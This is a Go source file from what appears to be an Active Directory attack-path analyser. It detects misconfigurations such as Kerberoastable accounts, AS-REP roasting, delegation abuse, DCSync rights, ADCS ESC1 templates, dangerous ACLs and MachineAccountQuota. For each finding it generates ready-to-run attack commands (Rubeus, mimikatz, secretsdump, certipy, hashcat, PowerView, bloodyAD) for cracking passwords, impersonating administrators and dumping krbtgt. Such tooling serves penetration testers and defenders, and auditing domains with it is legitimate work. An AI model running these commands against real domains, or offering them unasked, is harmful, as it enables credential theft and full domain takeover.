package analysis

import (
	"fmt"
	"sort"
	"strings"

	"adx/internal/graph"
)

type Severity string

const (
	Crit Severity = "crit"
	High Severity = "high"
	Med  Severity = "med"
)

var sevRank = map[Severity]int{Crit: 0, High: 1, Med: 2}

// Finding is one detected attack opportunity.
type Finding struct {
	ID        string   `json:"id"`
	Technique string   `json:"technique"`
	Severity  Severity `json:"severity"`
	Title     string   `json:"title"`
	Anchor    string   `json:"node"`           // node the ! badge sits on
	Entry     string   `json:"entry"`          // principal that must be controlled ("" = any foothold)
	Chain     []string `json:"chain"`          // intrinsic exploit path, entry..target
	Why       string   `json:"why"`            // why this is exploitable
	Steps     []string `json:"steps"`          // how, in order
	Impact    string   `json:"impact"`         // what control it yields
	Commands  Commands `json:"commands"`       // ready-to-run, per platform
}

type Command struct {
	Label string `json:"label"`
	Code  string `json:"code"`
}

type Commands struct {
	Linux   []Command `json:"linux"`
	Windows []Command `json:"windows"`
}

func (m *Model) node(id string) *graph.Node { return m.G.Nodes[id] }

func (m *Model) short(id string) string {
	if n := m.node(id); n != nil {
		return n.Short()
	}
	return id
}

func (m *Model) detect() {
	seen := map[string]bool{}
	add := func(f *Finding) {
		if f == nil || seen[f.ID] {
			return
		}
		seen[f.ID] = true
		m.Findings = append(m.Findings, f)
	}
	for id, n := range m.G.Nodes {
		switch n.Kind {
		case graph.User:
			add(m.kerberoast(id, n))
			add(m.asrep(id, n))
		case graph.Computer:
			add(m.unconstrained(id, n))
		case graph.Domain:
			add(m.maq(id, n))
		}
		m.delegation(id, n, add)
		m.dcsync(id, n, add)
		m.esc1Finding(id, n, add)
		m.dangerousACL(id, n, add)
	}
	sort.SliceStable(m.Findings, func(i, j int) bool {
		a, b := m.Findings[i], m.Findings[j]
		if sevRank[a.Severity] != sevRank[b.Severity] {
			return sevRank[a.Severity] < sevRank[b.Severity]
		}
		return a.Title < b.Title
	})
}

func (m *Model) domainForCmd(n *graph.Node) (string, string) {
	d := m.DomainOf(n)
	dn, dc := "<domain>", "<dc-fqdn>"
	if d != "" {
		dn = strings.ToLower(m.node(d).Name)
		dc = m.DCName(d)
	}
	return dn, dc
}

func (m *Model) kerberoast(id string, n *graph.Node) *Finding {
	if !n.Bool("hasspn") || !enabled(n) {
		return nil
	}
	name := n.Short()
	dn, dc := m.domainForCmd(n)
	why := fmt.Sprintf("%s has a Service Principal Name set, so any authenticated user can request its service ticket and crack the password offline.", name)
	if rc4, _ := n.Props["rc4"].(bool); rc4 {
		why += " RC4 is allowed, which makes cracking faster."
	}
	return &Finding{
		ID: "kerberoast:" + id, Technique: "kerberoast", Severity: High,
		Title: "Kerberoastable: " + name, Anchor: id, Entry: "",
		Chain: []string{id},
		Why:   why,
		Steps: []string{
			fmt.Sprintf("Request a service ticket for %s with any domain account.", name),
			"Crack the ticket offline (hashcat mode 13100).",
		},
		Impact: name + "'s cleartext password, and everything that account can reach.",
		Commands: Commands{
			Linux: []Command{
				{"Request the ticket", fmt.Sprintf("GetUserSPNs.py %s/<user>:'<password>' -request-user %s -dc-ip %s -outputfile %s.hash", dn, strings.ToLower(name), dc, strings.ToLower(name))},
				{"Crack it", fmt.Sprintf("hashcat -m 13100 %s.hash rockyou.txt", strings.ToLower(name))},
			},
			Windows: []Command{{"Request the ticket (Rubeus)", fmt.Sprintf("Rubeus.exe kerberoast /user:%s /nowrap", strings.ToLower(name))}},
		},
	}
}

func (m *Model) asrep(id string, n *graph.Node) *Finding {
	if !n.Bool("dontreqpreauth") || !enabled(n) {
		return nil
	}
	name := n.Short()
	dn, dc := m.domainForCmd(n)
	return &Finding{
		ID: "asrep:" + id, Technique: "asrep", Severity: High,
		Title: "AS-REP roastable: " + name, Anchor: id, Entry: "",
		Chain: []string{id},
		Why:   fmt.Sprintf("%s has Kerberos pre-authentication disabled. Anyone who can reach the DC can request an AS-REP and crack it offline, no credentials required.", name),
		Steps: []string{"Request an AS-REP for " + name + ".", "Crack it offline (hashcat mode 18200)."},
		Impact: name + "'s cleartext password.",
		Commands: Commands{
			Linux: []Command{
				{"Request the AS-REP", fmt.Sprintf("GetNPUsers.py %s/%s -no-pass -dc-ip %s -format hashcat -outputfile %s.hash", dn, strings.ToLower(name), dc, strings.ToLower(name))},
				{"Crack it", fmt.Sprintf("hashcat -m 18200 %s.hash rockyou.txt", strings.ToLower(name))},
			},
			Windows: []Command{{"Request the AS-REP (Rubeus)", fmt.Sprintf("Rubeus.exe asreproast /user:%s /nowrap", strings.ToLower(name))}},
		},
	}
}

func (m *Model) unconstrained(id string, n *graph.Node) *Finding {
	if !n.Bool("unconstraineddelegation") || n.Bool("isdc") || !enabled(n) {
		return nil
	}
	name := n.Short()
	d := m.DomainOf(n)
	dn, dc := m.domainForCmd(n)
	chain := []string{id}
	if d != "" {
		chain = append(chain, d)
	}
	return &Finding{
		ID: "unconstrained:" + id, Technique: "unconstrained", Severity: Crit,
		Title: "Unconstrained delegation: " + name, Anchor: id, Entry: id,
		Chain: chain,
		Why:   fmt.Sprintf("%s is trusted for unconstrained delegation. With local admin on it, you can coerce a DC to authenticate and capture its TGT.", name),
		Steps: []string{
			"Get local admin on " + name + ".",
			"Monitor for incoming TGTs on " + name + ".",
			"Coerce a DC to authenticate (PrinterBug / PetitPotam).",
			"Inject the DC machine TGT and run DCSync.",
		},
		Impact: "A domain controller's TGT, then DCSync of krbtgt. Full domain compromise.",
		Commands: Commands{
			Linux: []Command{
				{"Coerce the DC toward " + name, fmt.Sprintf("printerbug.py %s/<user>:'<password>'@%s %s", dn, dc, strings.ToLower(name))},
				{"DCSync with the captured ticket", "export KRB5CCNAME=dc.ccache\nsecretsdump.py -k -no-pass " + dc + " -just-dc-user krbtgt"},
			},
			Windows: []Command{
				{"On " + name + ": wait for the TGT", "Rubeus.exe monitor /interval:5 /nowrap"},
				{"Coerce the DC", "SpoolSample.exe " + dc + " " + strings.ToLower(name)},
				{"Inject and DCSync", "Rubeus.exe ptt /ticket:<base64>\nmimikatz # lsadump::dcsync /user:<domain>\\krbtgt"},
			},
		},
	}
}

func (m *Model) delegation(id string, n *graph.Node, add func(*Finding)) {
	// RBCD: an edge granting write of msDS-AllowedToActOnBehalfOfOtherIdentity.
	for _, e := range m.G.In(id) {
		if e.Kind != "AllowedToAct" && e.Kind != "AddAllowedToAct" {
			continue
		}
		target := m.node(id)
		if target == nil || target.Kind != graph.Computer {
			continue
		}
		p := m.short(e.From)
		host := target.Short()
		dn, dc := m.domainForCmd(target)
		add(&Finding{
			ID: "rbcd:" + e.From + ":" + id, Technique: "rbcd", Severity: Crit,
			Title: "Resource-based constrained delegation: " + host, Anchor: id, Entry: e.From,
			Chain: []string{e.From, id},
			Why:   fmt.Sprintf("%s can write %s's msDS-AllowedToActOnBehalfOfOtherIdentity, which sets up RBCD and local admin on it.", p, host),
			Steps: []string{
				"Create a machine account you control (needs MachineAccountQuota > 0).",
				"Write that account into " + host + "'s msDS-AllowedToActOnBehalfOfOtherIdentity.",
				"Use S4U2Self + S4U2Proxy to get a ticket to " + host + " as Administrator.",
			},
			Impact: "Local admin on " + host + ". If a privileged account has a session there, that account too.",
			Commands: Commands{
				Linux: []Command{
					{"Create a machine account", fmt.Sprintf("addcomputer.py -computer-name '<newpc>$' -computer-pass '<newpass>' %s/<user>:'<password>' -dc-ip %s", dn, dc)},
					{"Set RBCD on " + host, fmt.Sprintf("rbcd.py -delegate-from '<newpc>$' -delegate-to '%s$' -action write %s/<user>:'<password>' -dc-ip %s", host, dn, dc)},
					{"Request a ticket as Administrator", fmt.Sprintf("getST.py -spn cifs/%s -impersonate Administrator %s/'<newpc>$':'<newpass>' -dc-ip %s", strings.ToLower(host)+"."+dn, dn, dc)},
				},
				Windows: []Command{
					{"Create a machine account (Powermad)", "New-MachineAccount -MachineAccount <newpc> -Password $(ConvertTo-SecureString '<newpass>' -AsPlainText -Force)"},
					{"S4U as Administrator (Rubeus)", fmt.Sprintf("Rubeus.exe hash /password:<newpass> /user:<newpc>$\nRubeus.exe s4u /user:<newpc>$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/%s /ptt", strings.ToLower(host)+"."+dn)},
				},
			},
		})
	}
	// Constrained delegation with protocol transition.
	if n.Bool("trustedtoauth") {
		for _, e := range m.G.Out(id) {
			if e.Kind != "AllowedToDelegate" {
				continue
			}
			self := n.Short()
			tgt := m.short(e.To)
			dn, dc := m.domainForCmd(n)
			add(&Finding{
				ID: "constrained:" + id + ":" + e.To, Technique: "constrained", Severity: Crit,
				Title: "Constrained delegation: " + self, Anchor: id, Entry: id,
				Chain: []string{id, e.To},
				Why:   fmt.Sprintf("%s is trusted to authenticate for delegation to %s and can impersonate any user via S4U.", self, tgt),
				Steps: []string{"Control " + self + ".", "Use S4U2Self + S4U2Proxy to impersonate Administrator to " + tgt + "."},
				Impact: "Administrator access to " + tgt + ".",
				Commands: Commands{
					Linux:   []Command{{"Impersonate via S4U", fmt.Sprintf("getST.py -spn <spn> -impersonate Administrator %s/'%s':'<password>' -dc-ip %s", dn, strings.ToLower(self), dc)}},
					Windows: []Command{{"S4U (Rubeus)", fmt.Sprintf("Rubeus.exe s4u /user:%s /rc4:<hash> /impersonateuser:Administrator /msdsspn:<spn> /ptt", strings.ToLower(self))}},
				},
			})
		}
	}
}

func (m *Model) dcsync(id string, n *graph.Node, add func(*Finding)) {
	for _, e := range m.G.Out(id) {
		if e.Kind != "DCSync" {
			continue
		}
		// Skip the expected DCs and domain-admin groups; those are not findings.
		if n.Bool("isdc") || m.isAdminGroup(id) {
			continue
		}
		p := n.Short()
		dn, dc := m.domainForCmd(n)
		add(&Finding{
			ID: "dcsync:" + id, Technique: "dcsync", Severity: Crit,
			Title: "DCSync rights: " + p, Anchor: id, Entry: id,
			Chain: []string{id, e.To},
			Why:   fmt.Sprintf("%s holds replication rights (GetChanges + GetChangesAll) on the domain but is not a standard admin. Easy to miss in reviews.", p),
			Steps: []string{"Control " + p + ".", "Replicate secrets from a DC."},
			Impact: "Every domain hash, including krbtgt. Full domain compromise.",
			Commands: Commands{
				Linux:   []Command{{"DCSync", fmt.Sprintf("secretsdump.py %s/'%s':'<password>'@%s -just-dc-user krbtgt", dn, strings.ToLower(p), dc)}},
				Windows: []Command{{"DCSync (mimikatz)", "lsadump::dcsync /domain:" + dn + " /user:<domain>\\krbtgt"}},
			},
		})
	}
}

func (m *Model) isAdminGroup(id string) bool {
	r := rid(id)
	return r == "512" || r == "519" || wellKnownSuffix(id) == "S-1-5-32-544"
}

func (m *Model) esc1Finding(id string, n *graph.Node, add func(*Finding)) {
	if n.Kind != graph.CertTemplate || !m.esc1(n) {
		return
	}
	name := n.Short()
	d := m.DomainOf(n)
	dn, dc := m.domainForCmd(n)
	ca := n.Str("certificateauthorities")
	if ca == "" {
		ca = "CORP-CA"
	}
	chain := []string{id}
	if d != "" {
		chain = append(chain, d)
	}
	add(&Finding{
		ID: "esc1:" + id, Technique: "esc1", Severity: Crit,
		Title: "ADCS ESC1: " + name, Anchor: id, Entry: "",
		Chain: chain,
		Why:   fmt.Sprintf("Template %s allows client authentication, lets the requester supply the subject (SAN), and needs no manager approval. Any enrollee can request a certificate for any account.", name),
		Steps: []string{
			"Request a certificate from " + name + " with administrator as the UPN.",
			"Authenticate with the certificate (PKINIT) to get a TGT and the NT hash.",
		},
		Impact: "Authenticate as any account, including a domain admin.",
		Commands: Commands{
			Linux: []Command{
				{"Request the certificate", fmt.Sprintf("certipy req -u <user>@%s -p '<password>' -ca %s -template %s -upn administrator@%s -dc-ip %s", dn, ca, name, dn, dc)},
				{"Authenticate with it", fmt.Sprintf("certipy auth -pfx administrator.pfx -dc-ip %s", dc)},
			},
			Windows: []Command{
				{"Request the certificate (Certify)", fmt.Sprintf("Certify.exe request /ca:%s\\%s /template:%s /altname:administrator", dc, ca, name)},
				{"Get a TGT (Rubeus)", "Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfx-pass> /ptt"},
			},
		},
	})
}

// dangerousACL reports write-equivalent control over a tier-zero object.
var aclTech = map[string]string{
	"GenericAll": "Full control", "GenericWrite": "GenericWrite", "WriteDacl": "WriteDacl",
	"WriteOwner": "WriteOwner", "Owns": "Ownership", "AllExtendedRights": "AllExtendedRights",
	"ForceChangePassword": "ForceChangePassword", "AddMember": "AddMember",
	"AddKeyCredentialLink": "Shadow credentials", "WriteSPN": "Targeted kerberoast",
}

func (m *Model) dangerousACL(id string, n *graph.Node, add func(*Finding)) {
	if !m.TierZero[id] {
		return
	}
	// One finding per (right -> target); pick the first qualifying principal.
	byRight := map[string]string{}
	for _, e := range m.G.In(id) {
		if _, ok := aclTech[e.Kind]; !ok {
			continue
		}
		if m.TierZero[e.From] || Broad(e.From) && e.Kind == "MemberOf" {
			continue
		}
		if _, seen := byRight[e.Kind]; !seen {
			byRight[e.Kind] = e.From
		}
	}
	for right, from := range byRight {
		p, tgt := m.short(from), n.Short()
		dn, dc := m.domainForCmd(n)
		sev := High
		if right == "GenericAll" || right == "WriteDacl" || right == "WriteOwner" || right == "Owns" {
			sev = Crit
		}
		add(&Finding{
			ID: "acl:" + right + ":" + id, Technique: "acl", Severity: sev,
			Title: aclTech[right] + " over " + tgt, Anchor: id, Entry: from,
			Chain: []string{from, id},
			Why:   fmt.Sprintf("%s has %s over %s, a tier-zero object. That is enough to take it over.", p, right, tgt),
			Steps: aclSteps(right, tgt),
			Impact: "Control of " + tgt + ", a tier-zero principal.",
			Commands: Commands{
				Linux:   aclLinux(right, dn, dc, strings.ToLower(tgt)),
				Windows: aclWindows(right, tgt),
			},
		})
	}
}

func aclSteps(right, tgt string) []string {
	switch right {
	case "ForceChangePassword":
		return []string{"Reset " + tgt + "'s password.", "Authenticate as " + tgt + "."}
	case "AddMember":
		return []string{"Add a principal you control to " + tgt + "."}
	case "AddKeyCredentialLink":
		return []string{"Add a key credential to " + tgt + " (shadow credentials).", "Authenticate with the certificate (PKINIT) and recover the NT hash."}
	case "WriteSPN":
		return []string{"Set an SPN on " + tgt + ".", "Kerberoast it and crack offline."}
	default:
		return []string{"Abuse " + right + " to grant yourself control of " + tgt + " (e.g. add a member, reset the password, or set RBCD)."}
	}
}

func aclLinux(right, dn, dc, tgt string) []Command {
	switch right {
	case "ForceChangePassword":
		return []Command{{"Reset the password", fmt.Sprintf("net rpc password %s -U %s/<user>%%'<password>' -S %s", tgt, dn, dc)}}
	case "AddKeyCredentialLink":
		return []Command{{"Shadow credentials", fmt.Sprintf("certipy shadow auto -u <user>@%s -p '<password>' -account %s -dc-ip %s", dn, tgt, dc)}}
	default:
		return []Command{{"Abuse the ACL (bloodyAD)", fmt.Sprintf("bloodyAD -d %s --host %s -u <user> -p '<password>' add groupMember '%s' <you>", dn, dc, tgt)}}
	}
}

func aclWindows(right, tgt string) []Command {
	switch right {
	case "ForceChangePassword":
		return []Command{{"Reset the password (PowerView)", fmt.Sprintf("Set-DomainUserPassword -Identity %s -AccountPassword (ConvertTo-SecureString '<newpass>' -AsPlainText -Force)", tgt)}}
	case "AddMember":
		return []Command{{"Add yourself (PowerView)", fmt.Sprintf("Add-DomainGroupMember -Identity '%s' -Members <you>", tgt)}}
	case "AddKeyCredentialLink":
		return []Command{{"Shadow credentials (Whisker)", fmt.Sprintf("Whisker.exe add /target:%s", tgt)}}
	default:
		return []Command{{"Take ownership / write DACL (PowerView)", fmt.Sprintf("Set-DomainObjectOwner -Identity '%s' -OwnerIdentity <you>\nAdd-DomainObjectAcl -TargetIdentity '%s' -PrincipalIdentity <you> -Rights All", tgt, tgt)}}
	}
}

func (m *Model) maq(id string, n *graph.Node) *Finding {
	q, ok := n.Int("machineaccountquota")
	if !ok || q <= 0 {
		return nil
	}
	return &Finding{
		ID: "maq:" + id, Technique: "maq", Severity: Med,
		Title: fmt.Sprintf("MachineAccountQuota = %d", q), Anchor: id, Entry: "",
		Chain: []string{id},
		Why:   fmt.Sprintf("Any authenticated user can join up to %d computers to the domain. This enables RBCD and several relay attacks.", q),
		Steps: []string{"Create a machine account with any domain user."},
		Impact: "An enabler on its own; it does not escalate directly.",
		Commands: Commands{
			Linux:   []Command{{"Create a machine account", fmt.Sprintf("addcomputer.py -computer-name '<newpc>$' -computer-pass '<newpass>' %s/<user>:'<password>' -dc-ip %s", strings.ToLower(n.Name), m.DCName(id))}},
			Windows: []Command{{"Create a machine account (Powermad)", "New-MachineAccount -MachineAccount <newpc> -Password $(ConvertTo-SecureString '<newpass>' -AsPlainText -Force)"}},
		},
	}
}
